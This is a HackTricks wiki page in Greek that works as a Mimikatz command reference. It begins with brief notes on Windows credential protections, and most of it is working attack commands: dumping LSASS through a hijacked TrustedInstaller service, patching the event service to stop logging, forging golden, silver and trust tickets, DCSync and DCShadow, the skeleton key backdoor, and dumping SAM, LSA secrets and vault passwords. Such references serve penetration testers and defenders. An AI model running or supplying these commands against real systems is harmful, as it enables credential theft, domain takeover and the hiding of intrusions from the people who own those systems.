# Mimikatz

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:

{% embed url="https://academy.8ksec.io/" %}


**Αυτή η σελίδα βασίζεται σε μία από το [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Δείτε την πρωτότυπη για περισσότερες πληροφορίες!

## LM και Καθαρό Κείμενο στη μνήμη

Από τα Windows 8.1 και Windows Server 2012 R2 και μετά, έχουν εφαρμοστεί σημαντικά μέτρα για την προστασία από την κλοπή διαπιστευτηρίων:

- **LM hashes και κωδικοί πρόσβασης σε καθαρό κείμενο** δεν αποθηκεύονται πλέον στη μνήμη για την ενίσχυση της ασφάλειας. Μια συγκεκριμένη ρύθμιση μητρώου, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ πρέπει να ρυθμιστεί με μια τιμή DWORD `0` για να απενεργοποιηθεί η Αυθεντικοποίηση Digest, διασφαλίζοντας ότι οι κωδικοί πρόσβασης σε "καθαρό κείμενο" δεν αποθηκεύονται στη μνήμη LSASS.

- **Η Προστασία LSA** εισάγεται για να προστατεύσει τη διαδικασία της Τοπικής Αρχής Ασφαλείας (LSA) από μη εξουσιοδοτημένη ανάγνωση μνήμης και έγχυση κώδικα. Αυτό επιτυγχάνεται με την επισήμανση της LSASS ως προστατευμένη διαδικασία. Η ενεργοποίηση της Προστασίας LSA περιλαμβάνει:
1. Τροποποίηση του μητρώου στο _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ ρυθμίζοντας το `RunAsPPL` σε `dword:00000001`.
2. Υλοποίηση ενός Αντικειμένου Πολιτικής Ομάδας (GPO) που επιβάλλει αυτή την αλλαγή μητρώου σε διαχειριζόμενες συσκευές.

Παρά αυτές τις προστασίες, εργαλεία όπως το Mimikatz μπορούν να παρακάμψουν την Προστασία LSA χρησιμοποιώντας συγκεκριμένους οδηγούς, αν και τέτοιες ενέργειες είναι πιθανό να καταγραφούν στα αρχεία καταγραφής γεγονότων.

### Αντεπίθεση Αφαίρεσης SeDebugPrivilege

Οι διαχειριστές συνήθως έχουν SeDebugPrivilege, επιτρέποντάς τους να αποσφαλματώνουν προγράμματα. Αυτό το προνόμιο μπορεί να περιοριστεί για να αποτραπούν οι μη εξουσιοδοτημένες εκφορτώσεις μνήμης, μια κοινή τεχνική που χρησιμοποιούν οι επιτιθέμενοι για να εξάγουν διαπιστευτήρια από τη μνήμη. Ωστόσο, ακόμη και με αυτή την αφαίρεση προνομίου, ο λογαριασμός TrustedInstaller μπορεί να εκτελεί εκφορτώσεις μνήμης χρησιμοποιώντας μια προσαρμοσμένη ρύθμιση υπηρεσίας:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Αυτό επιτρέπει την εξαγωγή της μνήμης `lsass.exe` σε ένα αρχείο, το οποίο μπορεί στη συνέχεια να αναλυθεί σε άλλο σύστημα για την εξαγωγή διαπιστευτηρίων:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Η παραχάραξη των καταγραφών συμβάντων στο Mimikatz περιλαμβάνει δύο κύριες ενέργειες: την εκκαθάριση των καταγραφών συμβάντων και την επιδιόρθωση της υπηρεσίας Event για να αποτραπεί η καταγραφή νέων συμβάντων. Παρακάτω είναι οι εντολές για την εκτέλεση αυτών των ενεργειών:

#### Clearing Event Logs

- **Command**: Αυτή η ενέργεια στοχεύει στη διαγραφή των καταγραφών συμβάντων, καθιστώντας πιο δύσκολη την παρακολούθηση κακόβουλων δραστηριοτήτων.
- Το Mimikatz δεν παρέχει μια άμεση εντολή στην τυπική του τεκμηρίωση για την εκκαθάριση των καταγραφών συμβάντων απευθείας μέσω της γραμμής εντολών του. Ωστόσο, η παραχάραξη των καταγραφών συμβάντων συνήθως περιλαμβάνει τη χρήση εργαλείων συστήματος ή σεναρίων εκτός του Mimikatz για την εκκαθάριση συγκεκριμένων καταγραφών (π.χ., χρησιμοποιώντας PowerShell ή Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- Αυτή η πειραματική εντολή έχει σχεδιαστεί για να τροποποιεί τη συμπεριφορά της Υπηρεσίας Καταγραφής Συμβάντων, αποτρέποντας αποτελεσματικά την καταγραφή νέων συμβάντων.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- Η εντολή `privilege::debug` διασφαλίζει ότι το Mimikatz λειτουργεί με τα απαραίτητα δικαιώματα για να τροποποιήσει τις υπηρεσίες του συστήματος.
- Η εντολή `event::drop` στη συνέχεια επιδιορθώνει την υπηρεσία Καταγραφής Συμβάντων.

### Kerberos Ticket Attacks

### Golden Ticket Creation

Ένα Golden Ticket επιτρέπει την πρόσβαση σε επίπεδο τομέα μέσω της μίμησης. Κύρια εντολή και παράμετροι:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Το όνομα του τομέα.
- `/sid`: Ο Αναγνωριστικός Αριθμός Ασφαλείας (SID) του τομέα.
- `/user`: Το όνομα χρήστη που θα μιμηθεί.
- `/krbtgt`: Ο NTLM hash του λογαριασμού υπηρεσίας KDC του τομέα.
- `/ptt`: Εισάγει απευθείας το εισιτήριο στη μνήμη.
- `/ticket`: Αποθηκεύει το εισιτήριο για μελλοντική χρήση.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Δημιουργία Silver Ticket

Τα Silver Tickets παρέχουν πρόσβαση σε συγκεκριμένες υπηρεσίες. Κύρια εντολή και παράμετροι:

- Εντολή: Παρόμοια με το Golden Ticket αλλά στοχεύει σε συγκεκριμένες υπηρεσίες.
- Παράμετροι:
- `/service`: Η υπηρεσία που στοχεύει (π.χ., cifs, http).
- Άλλες παράμετροι παρόμοιες με το Golden Ticket.

Παράδειγμα:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Δημιουργία Εισιτηρίου Εμπιστοσύνης

Τα Εισιτήρια Εμπιστοσύνης χρησιμοποιούνται για την πρόσβαση σε πόρους σε διάφορους τομείς εκμεταλλευόμενα τις σχέσεις εμπιστοσύνης. Κύρια εντολή και παράμετροι:

- Εντολή: Παρόμοια με το Golden Ticket αλλά για σχέσεις εμπιστοσύνης.
- Παράμετροι:
- `/target`: Το FQDN του στόχου τομέα.
- `/rc4`: Το NTLM hash για τον λογαριασμό εμπιστοσύνης.

Παράδειγμα:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Additional Kerberos Commands

- **Listing Tickets**:
- Command: `kerberos::list`
- Λίστα όλων των Kerberos εισιτηρίων για την τρέχουσα συνεδρία χρήστη.

- **Pass the Cache**:
- Command: `kerberos::ptc`
- Εισάγει Kerberos εισιτήρια από αρχεία cache.
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:
- Command: `kerberos::ptt`
- Επιτρέπει τη χρήση ενός Kerberos εισιτηρίου σε άλλη συνεδρία.
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Command: `kerberos::purge`
- Καθαρίζει όλα τα Kerberos εισιτήρια από τη συνεδρία.
- Χρήσιμο πριν από τη χρήση εντολών χειρισμού εισιτηρίων για την αποφυγή συγκρούσεων.


### Active Directory Tampering

- **DCShadow**: Προσωρινά να κάνει μια μηχανή να λειτουργεί ως DC για χειρισμό αντικειμένων AD.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Μιμείται έναν DC για να ζητήσει δεδομένα κωδικών πρόσβασης.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: Εξάγει διαπιστευτήρια από LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Υποδύεται έναν DC χρησιμοποιώντας τα δεδομένα κωδικού πρόσβασης ενός υπολογιστή.
- *Δεν παρέχεται συγκεκριμένη εντολή για NetSync στο αρχικό κείμενο.*

- **LSADUMP::SAM**: Πρόσβαση στη τοπική βάση δεδομένων SAM.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Αποκρυπτογραφεί μυστικά που είναι αποθηκευμένα στο μητρώο.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Ορίζει ένα νέο NTLM hash για έναν χρήστη.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Ανακτά πληροφορίες πιστοποίησης εμπιστοσύνης.
- `mimikatz "lsadump::trust" exit`

### Miscellaneous

- **MISC::Skeleton**: Εισάγει ένα backdoor στο LSASS σε έναν DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Αποκτά δικαιώματα αντιγράφου ασφαλείας.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Αποκτά δικαιώματα αποσφαλμάτωσης.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Εμφανίζει διαπιστευτήρια για συνδεδεμένους χρήστες.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Εξάγει Kerberos εισιτήρια από τη μνήμη.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: Αλλάζει SID και SIDHistory.
- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: *Δεν παρέχεται συγκεκριμένη εντολή για modify στο αρχικό κείμενο.*

- **TOKEN::Elevate**: Υποδύεται tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Επιτρέπει πολλαπλές συνεδρίες RDP.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Λίστα συνεδριών TS/RDP.
- *Δεν παρέχεται συγκεκριμένη εντολή για TS::Sessions στο αρχικό κείμενο.*

### Vault

- Εξάγει κωδικούς πρόσβασης από το Windows Vault.
- `mimikatz "vault::cred /patch" exit`


<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:

{% embed url="https://academy.8ksec.io/" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
